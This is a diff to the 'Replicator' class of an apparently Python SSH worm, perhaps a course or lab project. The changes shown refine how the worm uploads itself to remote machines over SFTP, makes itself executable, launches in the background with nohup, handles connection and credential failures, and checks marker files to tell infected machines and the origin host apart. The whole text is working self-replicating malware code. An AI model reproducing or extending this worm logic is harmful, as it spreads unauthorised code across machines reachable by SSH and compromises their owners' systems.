@@ -4,6 +4,7 @@ import socket
 import os
 import shutil
 import subprocess
+import errno
 
 DEBUG = True
 
@@ -20,11 +21,9 @@ class Replicator(object):
 
 	INFECTED_MARKER_FILE      = "/tmp/infected.txt"
 	WORM_FILE                 = "/tmp/worm.py"
-	REPLICATOR_CLASS_FILE     = "/tmp/Replicator.py"
 	DEBUG_OUTPUT_FILE         = "/tmp/output.txt"
+	HOST_MARKER_FILE          = "/tmp/host.txt"
 	COMPILE_TMP_DIRECTORY     = ".tmp"
-	INFECTED_MARKER_DIRECTORY = "/tmp"
-	HOST_MARKER_FILE          = "host.txt"
 
 	# Connection indicators
 	SUCCESSFUL_CONNECTION = 0
@@ -48,12 +47,13 @@ class Replicator(object):
 			self.compileWorm()
 			sftpClient.put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
 		else:
-			sftpClient.put("worm.py", Replicator.WORM_FILE)
+			sftpClient.put("/tmp/worm.py", Replicator.WORM_FILE)
 
 		self.sshClient.exec_command("chmod a+x " + Replicator.WORM_FILE)
 
 		if DEBUG:
-			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
+			# self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " > " + Replicator.DEBUG_OUTPUT_FILE + " 2>&1 &")
+			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " >> " + Replicator.DEBUG_OUTPUT_FILE + " &")
 		else:
 			self.sshClient.exec_command("nohup python " + Replicator.WORM_FILE + " &")
 
@@ -66,6 +66,8 @@ class Replicator(object):
 			return Replicator.CONNECTION_ERROR
 		except paramiko.SSHException:
 			return Replicator.BAD_CREDENTIALS
+		except EOFError:
+			return Replicator.CONNECTION_ERROR
 
 		return Replicator.SUCCESSFUL_CONNECTION
 
@@ -116,22 +118,20 @@ class Replicator(object):
 	def remoteSystemIsInfected(self):
 		sftpClient = self.sshClient.open_sftp()
 
-		try:
-			sftpClient.get(Replicator.INFECTED_MARKER_FILE, Replicator.INFECTED_MARKER_DIRECTORY)
-		except IOError:
-			return False
-
-		return True
+		return Replicator.remoteFileExists(sftpClient, Replicator.INFECTED_MARKER_FILE)
 
 	def remoteSystemIsHost(self):
 		sftpClient = self.sshClient.open_sftp()
 
-		try:
-			sftpClient.get(Replicator.HOST_MARKER_FILE, Replicator.INFECTED_MARKER_DIRECTORY)
-		except IOError:
-			return False
+		return Replicator.remoteFileExists(sftpClient, Replicator.HOST_MARKER_FILE)
 
-		return True
+	@staticmethod
+	def remoteFileExists(sftp, path):
+		try:
+			sftp.stat(path)
+			return True
+		except IOError as e:
+			return False
 
 	@staticmethod
 	def isInfectedSystem():
